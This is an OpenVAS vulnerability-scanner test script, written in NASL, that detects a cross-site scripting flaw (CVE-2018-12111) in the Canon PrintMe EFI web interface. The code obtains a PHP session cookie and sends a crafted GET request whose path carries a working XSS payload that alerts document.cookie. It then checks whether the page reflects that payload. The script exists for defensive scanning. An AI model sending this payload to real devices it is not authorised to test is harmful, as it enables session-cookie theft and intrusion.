###############################################################################
# OpenVAS Vulnerability Test
#
# Canon PrintMe EFI Cross Site Scripting Vulnerability
#
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:efi:fiery";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.813608");
  script_version("2021-06-24T11:00:30+0000");
  script_cve_id("CVE-2018-12111");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2021-06-24 11:00:30 +0000 (Thu, 24 Jun 2021)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-07-30 17:52:00 +0000 (Mon, 30 Jul 2018)");
  script_tag(name:"creation_date", value:"2018-06-15 12:23:19 +0530 (Fri, 15 Jun 2018)");
  script_tag(name:"qod_type", value:"remote_vul");

  script_name("Canon PrintMe EFI Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"The host is installed with Canon PrintMe EFI
  and is prone to cross site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether it is possible to read a cookie or not.");

  script_tag(name:"insight", value:"The flaw is due to an input validation
  error in the Canon PrintMe EFI webinterface.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject arbitrary web script or HTML in a user's browser session
  within the trust relationship between their browser and the server.");

  script_tag(name:"affected", value:"Canon PrintMe EFI");

  script_tag(name:"solution", value:"No known solution was made available for at least one
  year since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/44882");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/148160");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_efi_fiery_webtools_detect.nasl");
  script_mandatory_keys("efi_fiery_webtools/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!http_port = get_app_port( cpe: CPE ))
  exit(0);

if(!get_app_location( port: http_port, cpe: CPE ))
  exit(0);

req = http_get_req( port: http_port, url: "/wt3/mydocs.php?language=en");
res = http_keepalive_send_recv( port: http_port, data: req );

session_id = eregmatch(pattern:"Set-Cookie: PHPSESSID=([^;]+)",string:res);
if(isnull(session_id[1]))exit(0);
sess = session_id[1];

url = "/wt3/mydocs.php/'%22--!%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E";
cookie_header = make_array( "Cookie", "PHPSESSID=" + sess);

req = http_get_req( port: http_port, url: url, add_headers: cookie_header);
res = http_keepalive_send_recv( data: req, port: http_port );

if(res =~ "^HTTP/1\.[01] 200" && '>EFI Software End User License Agreement' >< res &&
   'alt=CANON' >< res && "alert(document.cookie)" >< res)
{
  report = http_report_vuln_url(port: http_port, url: url);
  security_message(data: report, port: http_port);
  exit(0);
}

exit(0);
